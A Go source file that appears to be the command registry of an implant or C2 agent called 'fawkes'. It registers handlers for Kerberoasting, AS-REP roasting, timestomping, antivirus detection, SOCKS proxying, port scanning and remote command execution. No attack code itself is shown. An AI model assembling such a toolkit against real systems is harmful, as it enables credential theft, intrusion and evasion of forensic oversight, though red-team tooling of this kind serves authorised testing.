package commands

import (
	"log"
	"sync"

	"fawkes/pkg/structs"
)

var (
	commandRegistry = make(map[string]structs.Command)
	registryMutex   sync.RWMutex
)

// Initialize sets up all available commands
func Initialize() {
	log.Printf("[INFO] Initializing command handlers")

	// Register cross-platform commands
	RegisterCommand(&CatCommand{})
	RegisterCommand(&CdCommand{})
	RegisterCommand(&CpCommand{})
	RegisterCommand(&DownloadCommand{})
	RegisterCommand(&LsCommand{})
	RegisterCommand(&MkdirCommand{})
	RegisterCommand(&MvCommand{})
	RegisterCommand(&PsCommand{})
	RegisterCommand(&PwdCommand{})
	RegisterCommand(&RmCommand{})
	RegisterCommand(&RunCommand{})
	RegisterCommand(&SleepCommand{})
	RegisterCommand(&SocksCommand{})
	RegisterCommand(&UploadCommand{})
	RegisterCommand(&EnvCommand{})
	RegisterCommand(&ExitCommand{})
	RegisterCommand(&KillCommand{})
	RegisterCommand(&WhoamiCommand{})
	RegisterCommand(&IfconfigCommand{})
	RegisterCommand(&FindCommand{})
	RegisterCommand(&NetstatCommand{})
	RegisterCommand(&PortScanCommand{})
	RegisterCommand(&TimestompCommand{})
	RegisterCommand(&ArpCommand{})
	RegisterCommand(&SetenvCommand{})
	RegisterCommand(&AvDetectCommand{})
	RegisterCommand(&LinkCommand{})
	RegisterCommand(&UnlinkCommand{})
	RegisterCommand(&LdapQueryCommand{})
	RegisterCommand(&KerberoastCommand{})
	RegisterCommand(&AsrepCommand{})

	// Register platform-specific commands
	registerPlatformCommands()

	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
}

// RegisterCommand registers a command with the command registry
func RegisterCommand(cmd structs.Command) {
	registryMutex.Lock()
	defer registryMutex.Unlock()

	commandRegistry[cmd.Name()] = cmd
	// log.Printf("[DEBUG] Registered command: %s", cmd.Name())
}

// GetCommand retrieves a command from the registry
func GetCommand(name string) structs.Command {
	registryMutex.RLock()
	defer registryMutex.RUnlock()

	return commandRegistry[name]
}

// GetAllCommands returns all registered commands
func GetAllCommands() map[string]structs.Command {
	registryMutex.RLock()
	defer registryMutex.RUnlock()

	commands := make(map[string]structs.Command)
	for name, cmd := range commandRegistry {
		commands[name] = cmd
	}

	return commands
}
